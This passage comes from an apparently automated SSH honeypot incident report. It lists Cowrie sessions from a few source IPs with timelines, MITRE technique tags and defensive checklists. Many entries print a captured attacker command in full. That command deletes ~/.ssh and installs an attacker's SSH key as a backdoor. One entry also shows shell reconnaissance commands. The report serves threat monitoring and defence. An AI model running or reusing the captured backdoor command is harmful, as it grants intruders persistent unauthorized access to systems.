| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:51:45` | `cowrie.session.connect` |
| `2026-05-26 10:51:45` | `cowrie.client.version` |
| `2026-05-26 10:51:45` | `cowrie.client.kex` |
| `2026-05-26 10:51:46` | `cowrie.login.success` |
| `2026-05-26 10:51:47` | `cowrie.session.params` |
| `2026-05-26 10:51:47` | `cowrie.command.input` |
| `2026-05-26 10:51:47` | `cowrie.command.failed` |
| `2026-05-26 10:51:47` | `cowrie.log.closed` |
| `2026-05-26 10:51:48` | `cowrie.session.params` |
| `2026-05-26 10:51:48` | `cowrie.command.input` |
| `2026-05-26 10:51:48` | `cowrie.session.file_download` |
| `2026-05-26 10:51:48` | `cowrie.log.closed` |
| `2026-05-26 10:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79ce2f2ccec

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:51 |
| **Last Seen** | 2026-05-26 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:51:52` | `cowrie.session.connect` |
| `2026-05-26 10:51:52` | `cowrie.client.version` |
| `2026-05-26 10:51:52` | `cowrie.client.kex` |
| `2026-05-26 10:51:53` | `cowrie.login.success` |
| `2026-05-26 10:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3259c597b8

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:08 |
| **Last Seen** | 2026-05-26 11:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:08:46` | `cowrie.session.connect` |
| `2026-05-26 11:08:46` | `cowrie.client.version` |
| `2026-05-26 11:08:46` | `cowrie.client.kex` |
| `2026-05-26 11:08:48` | `cowrie.login.success` |
| `2026-05-26 11:08:48` | `cowrie.session.params` |
| `2026-05-26 11:08:48` | `cowrie.command.input` |
| `2026-05-26 11:08:48` | `cowrie.command.failed` |
| `2026-05-26 11:08:49` | `cowrie.log.closed` |
| `2026-05-26 11:08:49` | `cowrie.session.params` |
| `2026-05-26 11:08:49` | `cowrie.command.input` |
| `2026-05-26 11:08:49` | `cowrie.session.file_download` |
| `2026-05-26 11:08:49` | `cowrie.log.closed` |
| `2026-05-26 11:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c466523000b1

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:08 |
| **Last Seen** | 2026-05-26 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:08:53` | `cowrie.session.connect` |
| `2026-05-26 11:08:53` | `cowrie.client.version` |
| `2026-05-26 11:08:53` | `cowrie.client.kex` |
| `2026-05-26 11:08:54` | `cowrie.login.success` |
| `2026-05-26 11:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f17c9320945

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:09 |
| **Last Seen** | 2026-05-26 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:09:36` | `cowrie.session.connect` |
| `2026-05-26 11:09:36` | `cowrie.client.version` |
| `2026-05-26 11:09:36` | `cowrie.client.kex` |
| `2026-05-26 11:09:37` | `cowrie.login.success` |
| `2026-05-26 11:09:38` | `cowrie.session.params` |
| `2026-05-26 11:09:38` | `cowrie.command.input` |
| `2026-05-26 11:09:38` | `cowrie.command.failed` |
| `2026-05-26 11:09:39` | `cowrie.log.closed` |
| `2026-05-26 11:09:39` | `cowrie.session.params` |
| `2026-05-26 11:09:39` | `cowrie.command.input` |
| `2026-05-26 11:09:39` | `cowrie.session.file_download` |
| `2026-05-26 11:09:39` | `cowrie.log.closed` |
| `2026-05-26 11:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00ded495f96

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:09 |
| **Last Seen** | 2026-05-26 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:09:43` | `cowrie.session.connect` |
| `2026-05-26 11:09:43` | `cowrie.client.version` |
| `2026-05-26 11:09:43` | `cowrie.client.kex` |
| `2026-05-26 11:09:44` | `cowrie.login.success` |
| `2026-05-26 11:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c70329b940

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:12 |
| **Last Seen** | 2026-05-26 11:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:12:10` | `cowrie.session.connect` |
| `2026-05-26 11:12:10` | `cowrie.client.version` |
| `2026-05-26 11:12:10` | `cowrie.client.kex` |
| `2026-05-26 11:12:11` | `cowrie.login.success` |
| `2026-05-26 11:12:12` | `cowrie.session.params` |
| `2026-05-26 11:12:12` | `cowrie.command.input` |
| `2026-05-26 11:12:12` | `cowrie.command.failed` |
| `2026-05-26 11:12:12` | `cowrie.log.closed` |
| `2026-05-26 11:12:13` | `cowrie.session.params` |
| `2026-05-26 11:12:13` | `cowrie.command.input` |
| `2026-05-26 11:12:13` | `cowrie.session.file_download` |
| `2026-05-26 11:12:13` | `cowrie.log.closed` |
| `2026-05-26 11:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5318468f2e9

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:12 |
| **Last Seen** | 2026-05-26 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:12:17` | `cowrie.session.connect` |
| `2026-05-26 11:12:17` | `cowrie.client.version` |
| `2026-05-26 11:12:17` | `cowrie.client.kex` |
| `2026-05-26 11:12:18` | `cowrie.login.success` |
| `2026-05-26 11:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39528424f702

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:14 |
| **Last Seen** | 2026-05-26 11:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:14:45` | `cowrie.session.connect` |
| `2026-05-26 11:14:45` | `cowrie.client.version` |
| `2026-05-26 11:14:46` | `cowrie.client.kex` |
| `2026-05-26 11:14:47` | `cowrie.login.success` |
| `2026-05-26 11:14:48` | `cowrie.session.params` |
| `2026-05-26 11:14:48` | `cowrie.command.input` |
| `2026-05-26 11:14:48` | `cowrie.command.failed` |
| `2026-05-26 11:14:48` | `cowrie.log.closed` |
| `2026-05-26 11:14:48` | `cowrie.session.params` |
| `2026-05-26 11:14:48` | `cowrie.command.input` |
| `2026-05-26 11:14:49` | `cowrie.session.file_download` |
| `2026-05-26 11:14:49` | `cowrie.log.closed` |
| `2026-05-26 11:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5839da1590b

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:14 |
| **Last Seen** | 2026-05-26 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:14:52` | `cowrie.session.connect` |
| `2026-05-26 11:14:52` | `cowrie.client.version` |
| `2026-05-26 11:14:52` | `cowrie.client.kex` |
| `2026-05-26 11:14:54` | `cowrie.login.success` |
| `2026-05-26 11:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dcb624e44b3

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:15 |
| **Last Seen** | 2026-05-26 11:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:15:35` | `cowrie.session.connect` |
| `2026-05-26 11:15:35` | `cowrie.client.version` |
| `2026-05-26 11:15:35` | `cowrie.client.kex` |
| `2026-05-26 11:15:37` | `cowrie.login.success` |
| `2026-05-26 11:15:37` | `cowrie.session.params` |
| `2026-05-26 11:15:37` | `cowrie.command.input` |
| `2026-05-26 11:15:37` | `cowrie.command.failed` |
| `2026-05-26 11:15:38` | `cowrie.log.closed` |
| `2026-05-26 11:15:38` | `cowrie.session.params` |
| `2026-05-26 11:15:38` | `cowrie.command.input` |
| `2026-05-26 11:15:38` | `cowrie.session.file_download` |
| `2026-05-26 11:15:38` | `cowrie.log.closed` |
| `2026-05-26 11:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712ff6f144a2

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:15 |
| **Last Seen** | 2026-05-26 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:15:42` | `cowrie.session.connect` |
| `2026-05-26 11:15:42` | `cowrie.client.version` |
| `2026-05-26 11:15:42` | `cowrie.client.kex` |
| `2026-05-26 11:15:43` | `cowrie.login.success` |
| `2026-05-26 11:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcef262a3aaf

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:18 |
| **Last Seen** | 2026-05-26 11:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:18:08` | `cowrie.session.connect` |
| `2026-05-26 11:18:08` | `cowrie.client.version` |
| `2026-05-26 11:18:09` | `cowrie.client.kex` |
| `2026-05-26 11:18:10` | `cowrie.login.success` |
| `2026-05-26 11:18:10` | `cowrie.session.params` |
| `2026-05-26 11:18:10` | `cowrie.command.input` |
| `2026-05-26 11:18:10` | `cowrie.command.failed` |
| `2026-05-26 11:18:11` | `cowrie.log.closed` |
| `2026-05-26 11:18:11` | `cowrie.session.params` |
| `2026-05-26 11:18:11` | `cowrie.command.input` |
| `2026-05-26 11:18:12` | `cowrie.session.file_download` |
| `2026-05-26 11:18:12` | `cowrie.log.closed` |
| `2026-05-26 11:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0353a4384026

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:18 |
| **Last Seen** | 2026-05-26 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:18:15` | `cowrie.session.connect` |
| `2026-05-26 11:18:15` | `cowrie.client.version` |
| `2026-05-26 11:18:15` | `cowrie.client.kex` |
| `2026-05-26 11:18:17` | `cowrie.login.success` |
| `2026-05-26 11:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e0c053ac97

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:19 |
| **Last Seen** | 2026-05-26 11:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:19:04` | `cowrie.session.connect` |
| `2026-05-26 11:19:04` | `cowrie.client.version` |
| `2026-05-26 11:19:04` | `cowrie.client.kex` |
| `2026-05-26 11:19:05` | `cowrie.login.success` |
| `2026-05-26 11:19:06` | `cowrie.session.params` |
| `2026-05-26 11:19:06` | `cowrie.command.input` |
| `2026-05-26 11:19:06` | `cowrie.command.failed` |
| `2026-05-26 11:19:06` | `cowrie.log.closed` |
| `2026-05-26 11:19:07` | `cowrie.session.params` |
| `2026-05-26 11:19:07` | `cowrie.command.input` |
| `2026-05-26 11:19:07` | `cowrie.session.file_download` |
| `2026-05-26 11:19:07` | `cowrie.log.closed` |
| `2026-05-26 11:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c37dfae876a

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-26 11:19 |
| **Last Seen** | 2026-05-26 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 11:19:10` | `cowrie.session.connect` |
| `2026-05-26 11:19:10` | `cowrie.client.version` |
| `2026-05-26 11:19:11` | `cowrie.client.kex` |
| `2026-05-26 11:19:12` | `cowrie.login.success` |
| `2026-05-26 11:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b338f5eabcd1

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]99` |
| **First Seen** | 2026-05-26 12:26 |
| **Last Seen** | 2026-05-26 12:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:26:16` | `cowrie.session.connect` |
| `2026-05-26 12:26:17` | `cowrie.login.success` |
| `2026-05-26 12:26:17` | `cowrie.session.params` |
| `2026-05-26 12:26:18` | `cowrie.command.input` |
| `2026-05-26 12:26:18` | `cowrie.command.input` |
| `2026-05-26 12:26:19` | `cowrie.command.input` |
| `2026-05-26 12:26:20` | `cowrie.command.input` |
| `2026-05-26 12:26:20` | `cowrie.command.failed` |
| `2026-05-26 12:26:21` | `cowrie.log.closed` |
| `2026-05-26 12:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]99` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-930e22d49df3

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:44 |
| **Last Seen** | 2026-05-26 12:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
